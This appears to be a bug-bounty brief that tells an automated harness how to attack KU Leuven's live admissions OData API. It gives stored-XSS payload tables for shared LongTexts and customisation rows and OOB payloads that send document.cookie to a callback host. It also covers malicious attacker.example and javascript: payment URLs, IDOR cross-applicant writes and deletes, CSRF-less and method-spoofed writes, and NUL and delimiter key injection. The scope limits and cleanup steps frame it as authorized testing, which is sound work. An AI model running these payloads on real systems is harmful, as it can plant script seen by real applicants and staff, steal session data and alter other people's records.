# VM BRIEF — KU Leuven Admissions — Track E: Sweep-9 post-bundle-analysis authz tests

**Purpose:** Track B (authz-matrix) reported CLEAN NEGATIVE on the hand-picked write surface
Track A had visibility on. Track C+D (bundle read) then surfaced **six new attack surfaces Track
B did not touch**, each of which meaningfully changes the severity ceiling if the server does not
re-enforce a client-only rule. This brief runs those tests with the same guardrails as Track B —
same target-ID guard, 1.1 s/req rate, IMMEDIATE-STOP on foreign PII, mandatory cleanup — and
extends the harness with six new sweeps (S9-M3, S9-C1, S9-P1, S9-V1, S9-D1-plus, one-GET
verifications).

**Prioritization:** Sweep 9 (S9-M3 `/LongTexts`) is the crown jewel — every one of the ~14
HTML-render sinks in the entire UI binds to LongTexts. If the server accepts an applicant-session
MERGE on a LongTexts row, that is a **stored XSS whose rendered surface includes admission-letter
content, submit disclaimers, status descriptions, kot-information, and the payment disclaimer**,
in every language variant, seen by every applicant AND presumably by any staff-side viewer that
reads the same rows. **Run S9-M3 first** and commit its result before starting the rest — it
alone can end the campaign.

## Scope (STRICT — do not deviate)

Identical to Track B:
- ONLY hit `https://webwsp.aps.kuleuven.be/sap/opu/odata/sap/ZC_AD_APPLICANT_SRV/*`
- ONLY use accounts A (`IN01051619` / app `000000503432`) and B (`IN01051651` / app
  `000000503434`). NEVER an adjacent id — those are real applicants. The existing target-ID
  guard aborts the run if a non-A/non-B applicant/application id appears in any URL; keep it on.
- Max **1 request/second** overall. This is a live university system.
- IMMEDIATE-STOP any sweep on foreign-PII detection.
- Session-death detection: any 401 / 302→IdP → halt and ask for fresh cookies.
- Also permitted for one-shot verifications (Sweep 14): GET on
  `https://webwsp.aps.kuleuven.be/sap/bc/ui5_ui5/sap/zc_ad_appl/*` (static UI5 assets — the
  bundle's own directory tree). Fetch view/controller only (no probing).

Out of scope — do NOT touch:
- `idp.kuleuven.be`, `/esap/public/odata/*`, anything outside `ZC_AD_APPLICANT_SRV`.
- `webwsd.aps.kuleuven.be` / `webwsq.aps.kuleuven.be` (dev/test envs).
- `zc_ad_appl_chat` / `zc_oi_appl_*` UI5 apps (adjacent to `zc_ad_appl` — scope decision
  pending program confirmation; skip until then).

## Prereqs

- Fresh cookies at `~/kuleuven_creds/A.cookies` and `~/kuleuven_creds/B.cookies` (the current
  commit `6663220` is fine — expiry check is in the harness).
- The Track-B harness (`tools/authz_matrix.py`) — extend it with the new sweeps below.
  Reuse: host allow-list, target-ID guard, 1.1 s rate limit, IMMEDIATE-STOP, session-death,
  cleanup framework, `--dry-run` / `--sweeps` / `--append` flags, JSONL row format.
- Save results as `02-authz-matrix.jsonl` **appended** (use `--append`) so the full-run summary
  regenerator sees Track B + Track E rows together.

---

## Sweep 9 — S9-M3 `/LongTexts` full write-authz matrix (CROWN JEWEL)

**Question:** does the server accept a MERGE on any `/LongTexts('<lang>|<inst>|<year|appId>')`
row from an applicant session? If yes, does the write persist AND render for another user reading
the same row? Sub-question shape includes cross-language, cross-institution, cross-year, and
cross-applicationId poisoning.

**Prior baseline reads observed in the client bundle (all 200 in normal use):**
- `Main.getTeksten(lang, inst)` → `/LongTexts('<lang>|<inst>|2020')` — the "static" LongTexts
  keyed by (language, institution, hardcoded year `2020`). Feeds `teksten>/infoText` and (per
  Track D) `teksten>/opKotInfo`, `teksten>/payDisclaimer`, `teksten>/opKotWel`,
  `teksten>/opKotNiet`.
- `ApplicationDetail.getTekstenWithAdmCode(lang, inst, applicationId)` →
  `/LongTexts('<lang>|<inst>|<applicationId>')` — per-application LongTexts. Feeds the entire
  ApplicationDetail view's HTML surface: `statusOmschrijving`, `submitVinkje`,
  `followUpAdmLetter`, `followUpQuestionnair`, `onlineTekst`, `locatieTitel`, `submitInfo`
  (the **Link href** sink), and `payDisclaimer`.

### 9.1 — Discover the LongTexts entity property surface (metadata pass)

- GET `/$metadata` → parse the `<EntityType Name="LongText">` block → list every `<Property
  Name=...>` with type + max length.
- Enumerate every property the client actually reads by grepping the extracted
  `03-bundle/controller/*.js` for `teksten>/<propname>` and the views for the same.
- Emit a table: **`property × type × maxLen × client-read × client-write × render-context`.**
  Any property present in `$metadata` but never read by the client is an over-exposure
  candidate for the same MERGE test — extra points if it renders somewhere in a role we don't
  have (e.g. a staff-side reviewer view).

### 9.2 — Baseline captures (before any writes)

Fresh reads and stashes for later diff:
- `/LongTexts('EN|<A's inst>|2020')` → save whole response body
- `/LongTexts('EN|<A's inst>|<A's applicationId>')` → save whole body
- `/LongTexts('NL|<A's inst>|2020')` → save (language variant)
- `/LongTexts('NL|<A's inst>|<A's applicationId>')` → save

Same 4 reads under B's session → save.

### 9.3 — Write-authz probe grid (one row per (target key, property, payload))

For each **target key** in:
- `EN|<A's inst>|2020`  (own inst, static year)
- `NL|<A's inst>|2020`
- `EN|<A's inst>|<A's applicationId>`  (own app, own lang)
- `NL|<A's inst>|<A's applicationId>`
- `EN|<A's inst>|2099` (future year — does server create-on-demand?)
- `EN|<A's inst>|<B's applicationId>` (⚠ cross-applicant — the guard should ALLOW this because
  B is our other test account; the write is to A's session against B's key. **If server accepts,
  that's cross-user write.**)
- `EN|50000051|2020` (⚠ different institution — B's institution or a made-up id in the
  50000000+ range; **do NOT use a real other-institution id**; use `50000051` or `50000099`)

...and for each **property** enumerated in 9.1 (start with `infoText`, `submitVinkje`,
`payDisclaimer`, `submitInfo`, `statusOmschrijving`, `onlineTekst`, `locatieTitel`,
`opKotInfo`, `followUpAdmLetter`, `followUpQuestionnair`, `opKotWel`, `opKotNiet` — the ones
Track D confirmed render), MERGE the row with `{<property>: PAYLOAD}` where PAYLOAD cycles
through:

| Payload | Purpose |
|---|---|
| `<img src=x onerror=alert(1)>KLXSSPROBE_LT` | Classic; also our persistence marker |
| `<script>alert(1)</script>` | Script tag |
| `<svg onload=alert(1)>` | SVG event handler |
| `<a href="javascript:alert(1)">click</a>` | href scheme for the Link/href sink |
| `<img src=x onerror=fetch('//<oob>/?p='+document.location)>` | OOB callback for staff-side render detection (use your interactsh listener) |
| `<style>@import 'javascript:...'</style>` | Style-attribute sink |
| `KLXSSPROBE_LT_plain` | Plain marker — proves write persisted even if XSS filter strips markup |
| `<img\tsrc=x\tonerror=alert(1)>` | Whitespace-variant to bypass naive regex |
| `&lt;img src=x onerror=alert(1)&gt;` | Encoded — tests double-decode |

**For each MERGE:** log status, response body, `notable_flags`. Then **re-read the same key
and diff against baseline** — record `field_changed=True/False` and the exact stored value.

### 9.4 — Method-spoofing variants (on the highest-EV target key, e.g. `EN|<A's inst>|2020`)

If any 9.3 rows returned 403, try:
- `PUT /LongTexts('<key>')` instead of MERGE
- `POST /LongTexts` with `Content-Type: application/atom+xml;type=entry` — full-entity create
  attempt with a client-chosen composite key
- MERGE with header `X-HTTP-Method-Override: MERGE` explicit
- MERGE without the `x-csrf-token` header (Sweep 3 pattern applied to LongTexts) — if the
  filter is method-level rather than write-level, CSRF-absent MERGE might slip through
- `$batch`-wrapped MERGE in a changeset (Sweep 2 pattern applied to LongTexts) — inner status
  can differ from direct

### 9.5 — Composite-key parsing probes

The key is `<lang>|<inst>|<year|appId>`; server likely does a string split on `|`. Try:
- Extra segments: `EN|<inst>|2020|attacker=1` — some SAP OData parsers accept trailing garbage
- Escaped delimiter: `EN|<inst>|2020%7Cx` — is `%7C` treated as `|`?
- Empty segment: `EN||2020` — does empty inst fall back?
- Trailing null: `EN|<inst>|2020%00attacker` — SAP has historically had NUL-in-key bugs

### 9.6 — Cross-user read after write (the persistence + cross-render proof)

For every MERGE 9.3 that returned 204/200 with `field_changed=True`:
1. GET the same key from **A's session** → confirm persistence
2. GET the same key from **B's session** → **this is the cross-user proof**
   - If the payload appears in B's response body → the crown jewel: stored cross-user render
   - If B gets a different value → the write is per-session (weird but bounded)
   - If B gets 200 with no payload → the write persisted server-side but is scoped per-writer
     (server-side self-substitution similar to Sweep 4)
3. If B sees it, immediately **overwrite the field back to `""`** from A's session (cleanup) —
   and re-verify from B's session that cleanup worked.

### 9.7 — The `submitInfo` Link-href-scheme test (dedicated)

`ApplicationDetail.view.xml` binds `<Link href="{teksten>/submitInfo}" target="_blank">` — the
href is passed through **without** SAPUI5's `sanitizeContent` step (per source review), so a
stored `javascript:` URL fires on click. If S9-M3 general write succeeds, do a targeted probe:
- MERGE `{submitInfo:"javascript:fetch('//<oob>/?p='+document.cookie)"}`  — cookies are
  HttpOnly (MYSAPSSO2 is Secure/HttpOnly) so this exfiltrates only non-HttpOnly cookies, but
  it proves the click-XSS chain. **Use OOB, no alert() — alert will trigger a warning on the
  applicant's own screen if they open it before we clean up.**
- Verify via B's session read whether the modified href renders in B's ApplicationDetail. If
  yes → **cross-user click-XSS**.
- MANDATORY: reset `submitInfo` to baseline in `finally:`.

### 9.8 — Cleanup verification (mandatory)

For every LongTexts row/property touched by 9.3–9.7 that came back with `field_changed=True`:
- MERGE `{<property>: <original baseline value>}` from the same session that wrote it.
- Re-read; verify equal to baseline.
- Emit a `cleanup_ok=True/False` row.
- If any cleanup fails, **halt the whole run and shout** — leaving a rendered `<img
  onerror=...>` in a shared LongText row that another applicant could hit is not acceptable.

### 9.9 — Deliverable for Sweep 9

Sub-section in `02-authz-matrix-summary.md` (regenerated with `--summary-only`), plus a
**dedicated writeup** `03-sweep9-longtexts.md` containing:
- The property × key × payload matrix as a table
- Any `field_changed=True` row with baseline vs stored value
- Any B-side render row with A's payload appearing
- The composite-key parser findings (9.5)
- Cleanup verification totals
- **Verdict:** `CLEAN NEGATIVE` / `STORED WRITE — SELF-VISIBLE ONLY` / `STORED WRITE — CROSS-USER RENDER CONFIRMED`

---

## Sweep 10 — S9-C1 collection-write-via-singleton-key IDOR

**The shape:** `updateCurriculumBatch` sends MERGE to `/HigherEducations('0')`,
`/Interrupts('0')`, and `/LanguageKnowledges('0')` — all with URL key `'0'` — but the request
body carries a per-row id (`higherEducationId`, `interruptedId`, `language`). The server
therefore MUST demux by body-payload key, not by URL key. Every such write is a **collection
write where the target row is decided by the client body.** That is exactly the shape where
"but the URL key is mine" authz shortcuts fail.

### 10.1 — Baseline row enumeration

From A's session:
- GET `/Curriculums('0')/HigherEducations` → list every row and its `higherEducationId`. Save.
- GET `/Curriculums('0')/Interrupts` → same. Save.
- GET `/Languages('0')/LanguageKnowledges` → same. Save.

Same reads from B's session → save. **These give the known-good ids for each account.**

### 10.2 — Own-row baseline MERGE (sanity check)

From A's session, MERGE `/HigherEducations('0')` with body containing one of **A's own**
existing rows: `{higherEducationId:"<row1>", country:"BE", startingYear:"2020"}` (minimal
diff). Re-read → confirm normal behavior (row updated, no error). This is the control.

### 10.3 — Attacker-chosen new id (create-via-MERGE probe)

From A's session, MERGE `/HigherEducations('0')` with body carrying an id that A doesn't have:
- `{higherEducationId:"99999", country:"BE", startingYear:"2099", nameSchool:"KLTEST_S10", ...}` (all required fields; look at 10.1's row shape).
- If server responds 204 → re-read `/Curriculums('0')/HigherEducations` from A. Does the new
  row exist under A's account?
- If the new row exists, IS IT SCOPED TO A? Read `/Curriculums('0')/HigherEducations` from B's
  session — does row `99999` appear? If yes → we just created a row in a globally-shared table
  with attacker-chosen id → potential id-collision with real applicants.

### 10.4 — Cross-user write via body id

From A's session, MERGE `/HigherEducations('0')` with body `{higherEducationId:"<B's row1 id
from 10.1>", nameSchool:"KLTEST_S10_CROSS", ...}`.
- 204 = server accepted (bad sign — probably no authz).
- Re-read `/Curriculums('0')/HigherEducations` from **B's session**. Does B's row 1 now show
  `nameSchool="KLTEST_S10_CROSS"`? **If yes → cross-applicant write. Immediately halt further
  writes on that endpoint, revert B's row from A's session (which also confirms the write
  path), file the highest-severity finding.**
- Cleanup either way: revert nameSchool to baseline.

### 10.5 — DELETE via singleton (unused-by-client code path)

`services.deleteHigherEducation` is declared but no controller calls it. So the server may
never see it, meaning the authz test may miss it, meaning it may or may not have been implemented.
Direct probe:
- `DELETE /HigherEducations('0')` from A's session, no body. Log status.
- If 200/204: re-read `/Curriculums('0')/HigherEducations` — did it delete a row, all rows, or
  do nothing?
- If any row deleted, RESTORE it via MERGE with baseline data (10.2).

### 10.6 — POST-create attempt

`POST /HigherEducations` with a full entity body (composite atom-xml or JSON). Try client-chosen
`higherEducationId="99998"`. Same read-back cross-user check as 10.3.

### 10.7 — Same shape for Interrupts, LanguageKnowledges, DisciplineSet, TrefwoordenSet

Repeat 10.2–10.5 for:
- `/Interrupts('0')` with body id `interruptedId`
- `/LanguageKnowledges('0')` with body id `language` (⚠ language is the natural key — probe with
  a language A doesn't have; if server writes it, does `/Languages('0')/LanguageKnowledges` show
  it, and does B's read show it?)
- `/DisciplineSet(applicationId='<A>',key='<Y>')` — full composite in URL. Try MERGE with body
  `{applicationId:"<B's applicationId>", key:"1", disciplineCode:"..."}` — does the server route
  by URL key (safe) or by body payload (unsafe)?
- `/TrefwoordenSet(applicationId='<A>',key='<Y>')` — same probe.

### 10.8 — Cleanup verification and safety

For every write in 10.2–10.7, cleanup mandatory:
- MERGE the target row back to baseline captured in 10.1.
- Re-read from BOTH sessions to confirm cleanup.
- If any create (10.3, 10.6) succeeded, DELETE the created row via
  `DELETE /HigherEducations(higherEducationId='<id>')` (if that key format works) or by MERGE
  with all-empty-string fields — whichever the server accepts. Verify absence via re-read.

### 10.9 — Deliverable

`03-sweep10-singleton-idor.md`:
- Table: `endpoint × body-id × direction × observed` (direction = A→A, A→B-known, A→new-id,
  DELETE, POST-create)
- Cross-session read-back confirmations
- Verdicts per endpoint:
  - `URL-key routed (safe)` — server ignores body id if URL key mismatches
  - `BODY-key routed, own-scoped (limited)` — server writes to body id but only within caller's
    tenant
  - `BODY-key routed, cross-tenant (critical)` — cross-user write
  - `CREATE-ON-DEMAND accepted (needs downstream check)` — new row created with arbitrary id

---

## Sweep 11 — S9-P1 `appFeePayURL` and other Sweep-1-missed priv fields

**Question:** Sweep 1 tested a curated list of privileged fields on `Applications('<id>')` and
saw uniform 403 (server drops the whole MERGE on any filtered field). But that curated list did
not include several fields the bundle read newly discovered are client-writable-from-payload:
`appFeePayURL`, `followUpQuestionnair`, `submitVinkje` (read-only on client but MERGE never
attempted), and the read-only-flagged `isEditable`/`editable` booleans that Track B Sweep 11
already tested. Fill the gaps.

### 11.1 — Extend Sweep 1's priv-field list

Fields to test with a **field-isolated** MERGE (single-field body — because Track B showed
mixed bodies get 403 by association):

| Field | Payload variants |
|---|---|
| `appFeePayURL` | `"http://attacker.example/pay"`, `"//attacker.example/"`, `"javascript:alert(1)"`, `"data:text/html,<script>alert(1)</script>"`, `"https://webwsp.aps.kuleuven.be@attacker.example/"` (URL confusion), `"https://webwsp.aps.kuleuven.be.attacker.example/"` (dot-confusion) |
| `followUpQuestionnair` | `"<img src=x onerror=alert(1)>"` (free-text sink candidate), plain `"KLTEST_S11"` |
| `submitVinkje` | `true`, plain string |
| `templateMergeContent` | `"KLTEST_S11_TMC"` (Track B's Sweep 2 mentioned this exists on CommunicationSet; test on Applications too) |
| `caseAdmin` (retest with clean isolated MERGE, in case Sweep 1's mixed body caused the 403) | `"HACKER"` |
| any field the bundle-read § 8 flagged that isn't in Sweep 1's list — cross-reference now |

For each: MERGE, log status, re-read, `field_changed`. Persist per Sweep 1's baseline restore
pattern.

### 11.2 — `appFeePayURL` deep probe (if 11.1 accepts)

If the MERGE lands (204 + `field_changed=True`):
1. Confirm the payment click-flow: `ApplicationDetailPay.onPay` reads `application.appFeePayURL`
   and calls `window.location.replace(...)`. **Do NOT click** it — proof-of-persistence is
   sufficient. Log the stored URL.
2. Test scheme handling: try `javascript:` — is it stored verbatim, url-encoded, or
   scheme-stripped? If verbatim, the redirect flow will `location.replace('javascript:...')`
   which in most browsers navigates and executes.
3. **Cleanup:** MERGE back to baseline `appFeePayURL` immediately.

### 11.3 — Deliverable

Append to `02-authz-matrix-summary.md` under a new "Sweep 11" section:
- Table of field × status × field_changed × baseline vs stored
- Explicit verdict for `appFeePayURL`: `filter-rejected` / `stored-open-redirect` /
  `stored-with-scheme-restriction`

---

## Sweep 12 — S9-V1 `OrganisationCustomisations` image/label writes

**Question:** the `<Image src="./img/{custo>/imageLeft}">` binding in `Main.view.xml` fetches a
customisation string. If applicant can MERGE that, every applicant of the same institution loads
attacker-controlled content. Track B Sweep 1 didn't test this entity.

### 12.1 — Baseline

- GET `/$metadata` for `OrganisationCustomisation` entity — enumerate all properties.
- GET `/OrganisationCustomisations('<A's inst>')` — save baseline for every property.

### 12.2 — Property enumeration write matrix

For every string property (start with `imageLeft`, `imageRight`, and anything else that looks
like a URL / label / disclaimer):
- MERGE with `"KLTEST_S12_<prop>_plain"` (plain marker)
- MERGE with `"http://attacker.example/x.svg"` (URL — for image props)
- MERGE with `"../../evil.svg"` (path traversal on the `./img/<name>` prefix)
- MERGE with `"<img src=x onerror=alert(1)>"` (HTML sink, in case any label renders raw)

For each: log, re-read, `field_changed`, persist, cleanup on baseline.

### 12.3 — Cross-user render check

For any `field_changed=True`:
- Read from B's session — if B's institution is the same as A's (both `50000050`), B sees the
  poisoned customisation. This is inherent cross-user render **without needing any staff-side
  view** — every applicant of the institution is affected.
- **Immediately restore to baseline. Cleanup verify.**

### 12.4 — Deliverable

`03-sweep12-organisation-customisations.md` — table + verdicts as Sweep 11.

---

## Sweep 13 — Doctoral supervisor + missed free-text sinks

**Question:** Sweep 7 tested 25 free-text fields for stored-XSS. The bundle read surfaced free-
text bindings Sweep 7 didn't touch:
- `doctSupervisor` / `doctCoSupervisor` (Applications entity; doctoral flow)
- `callName` (PersInfos)
- `Addresses.contPers*` (7 fields — ICE emergency-contact free-text)
- `Addresses.additionalRemarks`
- `additionalremarks` / `additionalRemarks` case-sensitivity — Track A observed both spellings;
  worth retesting to see which one the server persists

### 13.1 — Sweep 7 rerun on the missed fields

Same shape as the existing Sweep 7 in the harness (`--sweeps 7` with an extended field list).
Each field: MERGE with `<img src=x onerror=fetch('//<oob>/?p=' + document.location)>KLXSSPROBE`
+ readback + classifier ({stored_raw, stored_stripped_or_empty, stored_encoded, unknown}).

### 13.2 — Cleanup and case-sensitivity note

For any pair like `additionalremarks` vs `additionalRemarks`: MERGE both variants, then read
both — one may 400 (unknown field) and the other 204. The one that succeeds is the canonical
name.

### 13.3 — Deliverable

Append `sweep 13` section to the summary; if any `stored_raw`, escalate a dedicated writeup.

---

## Sweep 14 — One-GET verifications (in-scope only)

Static-asset fetches on the bundle's own tree. All GET, ≤1 req/s.

### 14.1 — `ApplicationAttachments` view/controller

Fetch:
- `https://webwsp.aps.kuleuven.be/sap/bc/ui5_ui5/sap/zc_ad_appl/view/ApplicationAttachments.view.xml`
- `https://webwsp.aps.kuleuven.be/sap/bc/ui5_ui5/sap/zc_ad_appl/controller/ApplicationAttachments.controller.js`
- `https://webwsp.aps.kuleuven.be/sap/bc/ui5_ui5/sap/zc_ad_appl/fragment/AttachmentType.fragment.xml` (guess a plausible name)

For each: 200 / 404. Save 200 responses to `03-bundle/lazyloaded/`.

If any file exists but wasn't in the preload → the attachment flow is real, lazy-loaded, and
reachable. That's a **new attack surface** (attach flow: `POST/PUT`, likely to
`/Applications('<id>')/Attachments`, with client-controlled filename in `slug:` — same pattern
as the ApplicantPhoto raw XHR the bundle showed).

### 14.2 — `$metadata` property enumeration for over-exposure

Parse `/$metadata` and enumerate every `<EntityType>`. For each type, list all `<Property>`
elements. Grep the bundle for `>/<propname>` and `path:.<propname>` — properties never bound
in any view are over-exposure candidates. Emit a table `entity × property × client-bound
(y/n)`.

### 14.3 — Deliverable

`03-sweep14-lazyloaded-and-metadata.md`.

---

## Cross-cutting mechanics (apply throughout)

- **OOB collector.** Stand up an interactsh listener before starting Sweep 9. Payload wildcard
  `//<subdomain>.interactsh` — record every callback with source IP and full request. Any
  callback from a KU Leuven staff-network IP == cross-user render confirmed regardless of
  server response semantics. Include the listener URL only in Sweep 9.7's persistence payloads
  — do NOT put it in cleanup markers.
- **Rate + rows.** Every sweep row uses the same JSONL format:
  `{ts, sweep, entity_or_endpoint, method, variant, status, response_shape, notable_flags,
  cleanup_ok?}`. Use `--append` so Sweep 9–14 rows land in the same `02-authz-matrix.jsonl`.
- **Baseline restore.** For every `field_changed=True`, capture the baseline BEFORE the write
  and restore it in a `finally:` block. If ANY restore fails, halt the whole run and log
  `CLEANUP_FAILED` prominently.
- **Cross-session ordering.** Where a Sweep asks for "read from B", switch cookie jars — the
  harness must not mix A's csrf token with B's cookies. If the harness has no per-session
  cookie-jar isolation yet, add it first before running any Sweep-9.6 read.
- **IMMEDIATE-STOP triggers.** Any response body containing a name/email/DOB pattern that isn't
  Intigriti/Test/treyky* → halt the sweep-class immediately (per Track B convention).

---

## Deliverables (repo layout)

Under `intigriti/kuleuven_admissions/vm-results/`:

- `02-authz-matrix.jsonl` — appended with Sweep 9–14 rows
- `02-authz-matrix-summary.md` — regenerated (`--summary-only`) to include Sweep 9–14 tables
- `03-sweep9-longtexts.md` — dedicated writeup (crown-jewel result)
- `03-sweep10-singleton-idor.md`
- `03-sweep12-organisation-customisations.md` — only if the sweep produces any non-403 rows
- `03-sweep14-lazyloaded-and-metadata.md`
- `03-oob-callbacks.jsonl` — every interactsh hit with headers + source IP

Commit each artifact as it's produced; don't wait for the whole brief. If Sweep 9 lands a
result, **commit + push and stop** — the rest of the sweeps are lower priority given a
LongTexts cross-user write.

## Verdict format (top of each writeup)

- **STORED CROSS-USER RENDER CONFIRMED** — write accepted + B-session read shows payload +
  OOB callback fired.
- **STORED WRITE — SELF-VISIBLE ONLY** — write accepted + A-session reread shows payload +
  B-session read does not.
- **WRITE REJECTED — SERVER ENFORCES** — MERGE returns 403 uniformly; cleanup n/a.
- **PARTIAL** — write accepted for some (key, property) combinations but not others; enumerate
  the boundary.

## Non-goals

- No probing of `zc_ad_appl_chat` (adjacent-app scope pending program confirmation).
- No probing of `esap/public/*` (out of scope).
- No probing of `webwsd` / `webwsq`.
- No document uploads (Sweep 9 attachment probe — later brief once Sweep 14.1 confirms the
  attachment endpoint is reachable and we've got a fake-PDF flow).
- No cross-user reads from B's session beyond confirming Sweep-9/10/12 render — Track B
  already characterized B's read surface.
- No new interactsh payloads outside Sweep 9.7 — keep the callback surface small and revocable.

## Priority order for a single-lane VM

1. **Sweep 9 (S9-M3 LongTexts)** — full 9.1 → 9.9.
2. Commit, push. If Sweep 9 landed a STORED CROSS-USER RENDER, HALT — the researcher writes up
   before Sweeps 10–14 add scope. If Sweep 9 was clean-negative, continue.
3. Sweep 10 (S9-C1 singleton-key IDOR).
4. Sweep 11 (S9-P1 appFeePayURL + missed priv fields).
5. Sweep 12 (S9-V1 OrganisationCustomisations).
6. Sweep 13 (missed free-text sinks).
7. Sweep 14 (one-GET + metadata).
